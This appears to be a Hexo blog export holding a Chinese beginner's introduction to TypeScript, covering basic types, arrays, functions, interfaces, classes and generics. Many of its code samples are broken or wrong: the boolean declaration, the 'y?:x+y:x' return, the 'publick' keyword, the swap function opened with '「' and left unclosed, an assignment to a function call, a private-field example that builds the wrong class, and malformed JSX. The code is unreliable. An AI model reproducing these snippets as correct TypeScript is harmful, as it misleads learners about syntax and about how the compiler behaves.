详解</a></li>\n</ul>\n"},{"title":"简单介绍Typescript","date":"2018-03-30T07:28:20.000Z","_content":"\n## 简单介绍\n\n> 以下来自维基百科\n\n* TypeScript 是一种由微软开发的自由和开源的编程语言。它是 JavaScript 的一个严格超集，并添加了可选的静态类型和基于类的面向对象编程。C#的首席架构师以及 Delphi 和 Turbo Pascal 的创始人安德斯·海尔斯伯格参与了 TypeScript 的开发。\n\n* TypeScript 设计目标是开发大型应用，然后转译成 JavaScript。[7]由于 TypeScript 是 JavaScript 的严格超集，任何现有的 JavaScript 程序都是合法的 TypeScript 程序。\n\n## 为什么需要 ts\n\n> 普通的 js：假设我一个函数里面只能对字符串进行操作，要是我传了数字，直接就报错了，由此可见\n\n* 增加了代码的可读性和可维护性\n* 在编译阶段就能发现错误\n* 类型推论\n\n同时与 JavaScript 兼容良好，把.js 改为.ts 就能用\n\n## 基本使用\n\n### 基础类型\n\n```javascript\n//布尔值\nconst isDone = (boolean = false);\n// 数值\nconst num: number = 6;\n//字符串\nconst str: string = \"yoki\";\n//空值返回\nfunction say(): void {\n  console.log(\"hi\");\n}\n//null，undefined\nconst u: undefined = undefined;\nconst n: null = null;\n```\n\n### 数组\n\n```javascript\n//全是数字的数组\nconst numArr: number[] = [1, 2, 3];\n//数字和字符串都有的数组\nconst tmp: (number | string)[] = [1, \"2\", 3];\n//一个可能什么都有类型都有的数组\nconst anyArr: any[] = [1, \"1\", true];\n```\n\n### 函数\n\n```javascript\n//传入参数是数字，返回的也是数字\nfunction sum(x: number, y: number): number {\n  return x + y;\n}\n//可选型，用?,sum2(1)可以，sum（1，2）也可以\nfunction sum2(x:number,y?:number):number{\n    return y?:x+y:x\n}\n//参数默认值,sum3(1,'5')，y会被自动推导为number\nfunction sum3(x?:number,y=0){\n    return x+y\n}\n//剩余参数\nfunction concat(arr:any[],...items:any[]){\n    return arr.concat(items)\n}\nconcat([],1,2,3)=[1,2,3]\n```\n\n### 接口\n\n* 在面向对象，接口是一个很重要的概念，他是对行为的抽象，而具体如何行动需要由 class 去实现\n\n* ts 的接口是非常灵活的，既可以对类的一部分行为进行抽象，也可以用于对对象的形状进行描述\n\n```javascript\n//对对象形状的描述\ninterface Person{\n    name:string\n    age?:number,\n    say?:()=>void\n}\nconst yoki:Person={\n    name:'yoki',\n    age:18\n}\n//只读属性，不可修改\ninterface Person{\n    readonly id:number\n}\n```\n\n### 类\n\n> * public 修饰的属性或者方法都是公有的，可以在任何地方被访问到，默认所有的属性或方法都是 public\n\n> * private 修饰的属性或者方法都是私有的，不能在声明它的类的外部访问\n> * protected 修饰的属性或者方法都是受保护的，它与 pravate 类似，区别是它在子类是允许访问的\n\n```javascript\nclass Animal{\n    publick name;\n    public constructor(name){\n        this.name=name\n    }\n}\nlet a=new Animal('rabbit')\na.name//rabbit\na.name='tom'//tom\nclass Animal2{\n    private name;\n    public constructor(name){\n        this.name=name\n    }\n}\nlet b=new Animal('rabbit')\nb.name='tom'//报错\nclass Animal3{\n    protected name;\n    public constructor(name){\n        this.name=name\n    }\n}\nclass Cat extends Animal{\n    constructor(name){\n        super(name)\n        console.log(this.name)//可以的\n    }\n}\n```\n\n### 泛型\n\n是指在定义函数/接口或者类的时候，不预先指定具体的类型，而在使用的时候再指定类型\n\n```javascript\n//T是运行时候的类型\nfunction createArray<T>(value: T, len: number): Array<T> {\n  return Array(len).fill(value);\n}\n//多个类型\nfunction swap<T1,T2>(tuple:[T1,T2]):[T1,T2]「\nreturn [tuple[1],tuple[0]]\nswap([7,'six'])//['six',7]\n\n//泛型约束\nfunction getlen<T>(a:T):number{\n    return a.length\n}// length属性不存在type‘T’的里面，error\n\ninterface lengthwise{\n    length:number\n}\nfunction getlen2<T extends lengthwise>(a:T):number{\n    return a.length\n}\ngetlen2([])//ok\ngetlen2(123)//error\n//泛型类\ninterface Props{size:'big'|'small'}\ninterface State{visibily:boolean}\nclass App extends React.Component<Props,State>{\n    state={visibily:true}\n    constructor(props,context){\n        super(props,context)\n    }\n    handleClick=()=>this.setState({show:false})\n    //'error',show不在state接口\n    render(){\n        return this.state.visibily&& <button> type={this.props.size} onClick={this.handleClick} />\n    }\n}\nReactDom.render(<App size='middle' />,document.body)\n// error,middle不在props的size里\n```\n","source":"_posts/study-ts.md","raw":"---\ntitle: 简单介绍Typescript\ndate: 2018-03-30 15:28:20\ntags: Typescript\n---\n\n## 简单介绍\n\n> 以下来自维基百科\n\n* TypeScript 是一种由微软开发的自由和开源的编程语言。它是 JavaScript 的一个严格超集，并添加了可选的静态类型和基于类的面向对象编程。C#的首席架构师以及 Delphi 和 Turbo Pascal 的创始人安德斯·海尔斯伯格参与了 TypeScript 的开发。\n\n* TypeScript 设计目标是开发大型应用，然后转译成 JavaScript。[7]由于 TypeScript 是 JavaScript 的严格超集，任何现有的 JavaScript 程序都是合法的 TypeScript 程序。\n\n## 为什么需要 ts\n\n> 普通的 js：假设我一个函数里面只能对字符串进行操作，要是我传了数字，直接就报错了，由此可见\n\n* 增加了代码的可读性和可维护性\n* 在编译阶段就能发现错误\n* 类型推论\n\n同时与 JavaScript 兼容良好，把.js 改为.ts 就能用\n\n## 基本使用\n\n### 基础类型\n\n```javascript\n//布尔值\nconst isDone = (boolean = false);\n// 数值\nconst num: number = 6;\n//字符串\nconst str: string = \"yoki\";\n//空值返回\nfunction say(): void {\n  console.log(\"hi\");\n}\n//null，undefined\nconst u: undefined = undefined;\nconst n: null = null;\n```\n\n### 数组\n\n```javascript\n//全是数字的数组\nconst numArr: number[] = [1, 2, 3];\n//数字和字符串都有的数组\nconst tmp: (number | string)[] = [1, \"2\", 3];\n//一个可能什么都有类型都有的数组\nconst anyArr: any[] = [1, \"1\", true];\n```\n\n### 函数\n\n```javascript\n//传入参数是数字，返回的也是数字\nfunction sum(x: number, y: number): number {\n  return x + y;\n}\n//可选型，用?,sum2(1)可以，sum（1，2）也可以\nfunction sum2(x:number,y?:number):number{\n    return y?:x+y:x\n}\n//参数默认值,sum3(1,'5')，y会被自动推导为number\nfunction sum3(x?:number,y=0){\n    return x+y\n}\n//剩余参数\nfunction concat(arr:any[],...items:any[]){\n    return arr.concat(items)\n}\nconcat([],1,2,3)=[1,2,3]\n```\n\n### 接口\n\n* 在面向对象，接口是一个很重要的概念，他是对行为的抽象，而具体如何行动需要由 class 去实现\n\n* ts 的接口是非常灵活的，既可以对类的一部分行为进行抽象，也可以用于对对象的形状进行描述\n\n```javascript\n//对对象形状的描述\ninterface Person{\n    name:string\n    age?:number,\n    say?:()=>void\n}\nconst yoki:Person={\n    name:'yoki',\n    age:18\n}\n//只读属性，不可修改\ninterface Person{\n    readonly id:number\n}\n```\n\n### 类\n\n> * public 修饰的属性或者方法都是公有的，可以在任何地方被访问到，默认所有的属性或方法都是 public\n\n> * private 修饰的属性或者方法都是私有的，不能在声明它的类的外部访问\n> * protected 修饰的属性或者方法都是受保护的，它与 pravate 类似，区别是它在子类是允许访问的\n\n```javascript\nclass Animal{\n    publick name;\n    public constructor(name){\n        this.name=name\n    }\n}\nlet a=new Animal('rabbit')\na.name//rabbit\na.name='tom'//tom\nclass Animal2{\n    private name;\n    public constructor(name){\n        this.name=name\n    }\n}\nlet b=new Animal('rabbit')\nb.name='tom'//报错\nclass Animal3{\n    protected name;\n    public constructor(name){\n        this.name=name\n    }\n}\nclass Cat extends Animal{\n    constructor(name){\n        super(name)\n        console.log(this.name)//可以的\n    }\n}\n```\n\n### 泛型\n\n是指在定义函数/接口或者类的时候，不预先指定具体的类型，而在使用的时候再指定类型\n\n```javascript\n//T是运行时候的类型\nfunction createArray<T>(value: T, len: number): Array<T> {\n  return Array(len).fill(value);\n}\n//多个类型\nfunction swap<T1,T2>(tuple:[T1,T2]):[T1,T2]「\nreturn [tuple[1],tuple[0]]\nswap([7,'six'])//['six',7]\n\n//泛型约束\nfunction getlen<T>(a:T):number{\n    return a.length\n}// length属性不存在type‘T’的里面，error\n\ninterface lengthwise{\n    length:number\n}\nfunction getlen2<T extends lengthwise>(a:T):number{\n    return a.length\n}\ngetlen2([])//ok\ngetlen2(123)//error\n//泛型类\ninterface Props{size:'big'|'small'}\ninterface State{visibily:boolean}\nclass App extends React.Component<Props,State>{\n    state={visibily:true}\n    constructor(props,context){\n        super(props,context)\n    }\n    handleClick=()=>this.setState({show:false})\n    //'error',show不在state接口\n    render(){\n        return this.state.visibily&& <button> type={this.props.size} onClick={this.handleClick} />\n    }\n}\nReactDom.render(<App size='middle' />,document.body)\n// error,middle不在props的size里\n```\n","slug":"study-ts","published":1,"updated":"2018-04-15T09:18:42.068Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034s600490iof3eso58sd","content":"<h2 id=\"简单介绍\"><a href=\"#简单介绍\" class=\"headerlink\" title=\"简单介绍\"></a>简单介绍</h2><blockquote>\n<p>以下来自维基百科</p>\n</blockquote>\n<ul>\n<li><p>TypeScript 是一种由微软开发的自由和开源的编程语言。它是 JavaScript 的一个严格超集，并添加了可选的静态类型和基于类的面向对象编程。C#的首席架构师以及 Delphi 和 Turbo Pascal 的创始人安德斯·海尔斯伯格参与了 TypeScript 的开发。</p>\n</li>\n<li><p>TypeScript 设计目标是开发大型应用，然后转译成 JavaScript。[7]由于 TypeScript 是 JavaScript 的严格超集，任何现有的 JavaScript 程序都是合法的 TypeScript 程序。</p>\n</li>\n</ul>\n<h2 id=\"为什么需要-ts\"><a href=\"#为什么需要-ts\" class=\"headerlink\" title=\"为什么需要 ts\"></a>为什么需要 ts</h2><blockquote>\n<p>普通的 js：假设我一个函数里面只能对字符串进行操作，要是我传了数字，直接就报错了，由此可见</p>\n</blockquote>\n<ul>\n<li>增加了代码的可读性和可维护性</li>\n<li>在编译阶段就能发现错误</li>\n<li>类型推论</li>\n</ul>\n<p>同时与 JavaScript 兼容良好，把.js 改为.ts 就能用</p>\n<h2 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h2><h3 id=\"基础类型\"><a href=\"#基础类型\" class=\"headerlink\" title=\"基础类型\"></a>基础类型</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//布尔值</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> isDone = (boolean = <span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"comment\">// 数值</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> num: number = <span class=\"number\">6</span>;</span><br><span class=\"line\"><span class=\"comment\">//字符串</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> str: string = <span class=\"string\">\"yoki\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//空值返回</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">say</span>(<span class=\"params\"></span>): <span class=\"title\">void</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"hi\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//null，undefined</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> u: <span class=\"literal\">undefined</span> = <span class=\"literal\">undefined</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> n: <span class=\"literal\">null</span> = <span class=\"literal\">null</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//全是数字的数组</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> numArr: number[] = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\"><span class=\"comment\">//数字和字符串都有的数组</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> tmp: (number | string)[] = [<span class=\"number\">1</span>, <span class=\"string\">\"2\"</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\"><span class=\"comment\">//一个可能什么都有类型都有的数组</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> anyArr: any[] = [<span class=\"number\">1</span>, <span class=\"string\">\"1\"</span>, <span class=\"literal\">true</span>];</span><br></pre></td></tr></table></figure>\n<h3 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//传入参数是数字，返回的也是数字</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sum</span>(<span class=\"params\">x: number, y: number</span>): <span class=\"title\">number</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> x + y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//可选型，用?,sum2(1)可以，sum（1，2）也可以</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sum2</span>(<span class=\"params\">x:number,y?:number</span>):<span class=\"title\">number</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> y?:x+y:x</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//参数默认值,sum3(1,'5')，y会被自动推导为number</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sum3</span>(<span class=\"params\">x?:number,y=<span class=\"number\">0</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x+y</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//剩余参数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">concat</span>(<span class=\"params\">arr:any[],...items:any[]</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr.concat(items)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">concat([],<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>)=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br></pre></td></tr></table></figure>\n<h3 id=\"接口\"><a href=\"#接口\" class=\"headerlink\" title=\"接口\"></a>接口</h3><ul>\n<li><p>在面向对象，接口是一个很重要的概念，他是对行为的抽象，而具体如何行动需要由 class 去实现</p>\n</li>\n<li><p>ts 的接口是非常灵活的，既可以对类的一部分行为进行抽象，也可以用于对对象的形状进行描述</p>\n</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//对对象形状的描述</span></span><br><span class=\"line\">interface Person&#123;</span><br><span class=\"line\">    name:string</span><br><span class=\"line\">    age?:number,</span><br><span class=\"line\">    say?:<span class=\"function\"><span class=\"params\">()</span>=&gt;</span><span class=\"keyword\">void</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> yoki:Person=&#123;</span><br><span class=\"line\">    name:<span class=\"string\">'yoki'</span>,</span><br><span class=\"line\">    age:<span class=\"number\">18</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//只读属性，不可修改</span></span><br><span class=\"line\">interface Person&#123;</span><br><span class=\"line\">    readonly id:number</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类</h3><blockquote>\n<ul>\n<li>public 修饰的属性或者方法都是公有的，可以在任何地方被访问到，默认所有的属性或方法都是 public</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>private 修饰的属性或者方法都是私有的，不能在声明它的类的外部访问</li>\n<li>protected 修饰的属性或者方法都是受保护的，它与 pravate 类似，区别是它在子类是允许访问的</li>\n</ul>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Animal</span></span>&#123;</span><br><span class=\"line\">    publick name;</span><br><span class=\"line\">    public <span class=\"keyword\">constructor</span>(name)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name=name</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> a=<span class=\"keyword\">new</span> Animal(<span class=\"string\">'rabbit'</span>)</span><br><span class=\"line\">a.name<span class=\"comment\">//rabbit</span></span><br><span class=\"line\">a.name=<span class=\"string\">'tom'</span><span class=\"comment\">//tom</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Animal2</span></span>&#123;</span><br><span class=\"line\">    private name;</span><br><span class=\"line\">    public <span class=\"keyword\">constructor</span>(name)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name=name</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> b=<span class=\"keyword\">new</span> Animal(<span class=\"string\">'rabbit'</span>)</span><br><span class=\"line\">b.name=<span class=\"string\">'tom'</span><span class=\"comment\">//报错</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Animal3</span></span>&#123;</span><br><span class=\"line\">    protected name;</span><br><span class=\"line\">    public <span class=\"keyword\">constructor</span>(name)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name=name</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cat</span> <span class=\"keyword\">extends</span> <span class=\"title\">Animal</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(name)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(name)</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.name)<span class=\"comment\">//可以的</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"泛型\"><a href=\"#泛型\" class=\"headerlink\" title=\"泛型\"></a>泛型</h3><p>是指在定义函数/接口或者类的时候，不预先指定具体的类型，而在使用的时候再指定类型</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//T是运行时候的类型</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createArray</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">value: T, len: number</span>): <span class=\"title\">Array</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Array</span>(len).fill(value);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//多个类型</span></span><br><span class=\"line\">function swap&lt;T1,T2&gt;(tuple:[T1,T2]):[T1,T2]「</span><br><span class=\"line\"><span class=\"keyword\">return</span> [tuple[<span class=\"number\">1</span>],tuple[<span class=\"number\">0</span>]]</span><br><span class=\"line\">swap([<span class=\"number\">7</span>,<span class=\"string\">'six'</span>])<span class=\"comment\">//['six',7]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//泛型约束</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getlen</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">a:T</span>):<span class=\"title\">number</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a.length</span><br><span class=\"line\">&#125;<span class=\"comment\">// length属性不存在type‘T’的里面，error</span></span><br><span class=\"line\"></span><br><span class=\"line\">interface lengthwise&#123;</span><br><span class=\"line\">    length:number</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getlen2</span>&lt;<span class=\"title\">T</span> <span class=\"title\">extends</span> <span class=\"title\">lengthwise</span>&gt;(<span class=\"params\">a:T</span>):<span class=\"title\">number</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a.length</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">getlen2([])<span class=\"comment\">//ok</span></span><br><span class=\"line\">getlen2(<span class=\"number\">123</span>)<span class=\"comment\">//error</span></span><br><span class=\"line\"><span class=\"comment\">//泛型类</span></span><br><span class=\"line\">interface Props&#123;<span class=\"attr\">size</span>:<span class=\"string\">'big'</span>|<span class=\"string\">'small'</span>&#125;</span><br><span class=\"line\">interface State&#123;<span class=\"attr\">visibily</span>:boolean&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span>&lt;<span class=\"title\">Props</span>,<span class=\"title\">State</span>&gt;</span>&#123;</span><br><span class=\"line\">    state=&#123;<span class=\"attr\">visibily</span>:<span class=\"literal\">true</span>&#125;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(props,context)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(props,context)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    handleClick=<span class=\"function\"><span class=\"params\">()</span>=&gt;</span><span class=\"keyword\">this</span>.setState(&#123;<span class=\"attr\">show</span>:<span class=\"literal\">false</span>&#125;)</span><br><span class=\"line\">    <span class=\"comment\">//'error',show不在state接口</span></span><br><span class=\"line\">    render()&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.state.visibily&amp;&amp; &lt;button&gt; type=&#123;this.props.size&#125; onClick=&#123;this.handleClick&#125; /&gt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ReactDom.render(&lt;App size='middle' /&gt;,document.body)</span><br><span class=\"line\">// error,middle不在props的size里</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"简单介绍\"><a href=\"#简单介绍\" class=\"headerlink\" title=\"简单介绍\"></a>简单介绍</h2><blockquote>\n<p>以下来自维基百科</p>\n</blockquote>\n<ul>\n<li><p>TypeScript 是一种由微软开发的自由和开源的编程语言。它是 JavaScript 的一个严格超集，并添加了可选的静态类型和基于类的面向对象编程。C#的首席架构师以及 Delphi 和 Turbo Pascal 的创始人安德斯·海尔斯伯格参与了 TypeScript 的开发。</p>\n</li>\n<li><p>TypeScript 设计目标是开发大型应用，然后转译成 JavaScript。[7]由于 TypeScript 是 JavaScript 的严格超集，任何现有的 JavaScript 程序都是合法的 TypeScript 程序。</p>\n</li>\n</ul>\n<h2 id=\"为什么需要-ts\"><a href=\"#为什么需要-ts\" class=\"headerlink\" title=\"为什么需要 ts\"></a>为什么需要 ts</h2><blockquote>\n<p>普通的 js：假设我一个函数里面只能对字符串进行操作，要是我传了数字，直接就报错了，由此可见</p>\n</blockquote>\n<ul>\n<li>增加了代码的可读性和可维护性</li>\n<li>在编译阶段就能发现错误</li>\n<li>类型推论</li>\n</ul>\n<p>同时与 JavaScript 兼容良好，把.js 改为.ts 就能用</p>\n<h2 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h2><h3 id=\"基础类型\"><a href=\"#基础类型\" class=\"headerlink\" title=\"基础类型\"></a>基础类型</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//布尔值</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> isDone = (boolean = <span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"comment\">// 数值</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> num: number = <span class=\"number\">6</span>;</span><br><span class=\"line\"><span class=\"comment\">//字符串</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> str: string = <span class=\"string\">\"yoki\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//空值返回</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">say</span>(<span class=\"params\"></span>): <span class=\"title\">void</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"hi\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//null，undefined</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> u: <span class=\"literal\">undefined</span> = <span class=\"literal\">undefined</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> n: <span class=\"literal\">null</span> = <span class=\"literal\">null</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//全是数字的数组</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> numArr: number[] = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\"><span class=\"comment\">//数字和字符串都有的数组</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> tmp: (number | string)[] = [<span class=\"number\">1</span>, <span class=\"string\">\"2\"</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\"><span class=\"comment\">//一个可能什么都有类型都有的数组</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> anyArr: any[] = [<span class=\"number\">1</span>, <span class=\"string\">\"1\"</span>, <span class=\"literal\">true</span>];</span><br></pre></td></tr></table></figure>\n<h3 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span 